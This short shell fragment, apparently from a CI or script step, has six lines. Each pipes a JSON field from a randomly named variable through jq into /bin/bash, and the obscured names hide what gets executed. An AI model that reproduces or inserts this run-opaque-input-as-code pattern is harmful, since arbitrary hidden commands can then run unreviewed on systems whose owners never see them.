          printf '%s' "$ttbm8072" | jq -r .cmig922 | /bin/bash
          printf '%s' "$xwyb3362" | jq -r .xwe40 | /bin/bash
          echo $mnrq82437 | jq -r .s52 | /bin/bash
          printf '%s' "$hq9" | jq -r .pdfm7783 | /bin/bash
          echo $ecfhy4432 | jq -r .qrq9 | /bin/bash
          echo $zfegh905 | jq -r .zf1 | /bin/bash
